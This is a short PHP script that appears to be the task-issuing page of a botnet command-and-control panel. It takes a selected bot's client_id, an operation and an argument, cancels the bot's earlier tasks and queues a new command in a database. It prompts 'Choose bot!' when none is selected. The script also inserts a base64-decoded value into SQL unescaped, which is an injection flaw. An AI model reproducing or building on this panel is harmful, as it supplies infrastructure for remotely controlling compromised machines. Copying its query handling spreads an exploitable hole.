<?php
include ("../bd.php");

$client_id = htmlspecialchars($_POST['client_id']);
$client_id = mysqli_escape_string($link, $client_id);

$operation = htmlspecialchars($_POST['operation']);
$operation = mysqli_escape_string($link, $operation);

$argument = base64_encode($_POST['argument']);
$argument = mysqli_escape_string($link, $argument);

$argument_human =   base64_decode($argument);

	if(!empty($client_id)){
	$result = mysqli_query ($link,"UPDATE tasks SET active_flag= 0 WHERE client_id= '$client_id' " );
	if ($result == 'true') {}
	else {echo "<p style='color:white'>ne ok</p>";}

	$result2 = mysqli_query ($link,"INSERT INTO tasks (client_id, active_flag,operation,argument,status,argument_human) VALUES ('$client_id',1, '$operation','$argument',1,'$argument_human') " );
	if ($result == 'true') {
	echo '<META HTTP-EQUIV="Refresh"CONTENT="0; URL=index.php">';
		}
	else {echo "<p style='color:black'>ne ok</p>";}
 }
else{
	echo "<div align='center' style='color:white;font-size:20px'><p>Choose bot!<p></div>
		'<META HTTP-EQUIV='Refresh' CONTENT='2; URL=blank-page.php'>'";
}
?>
</html> 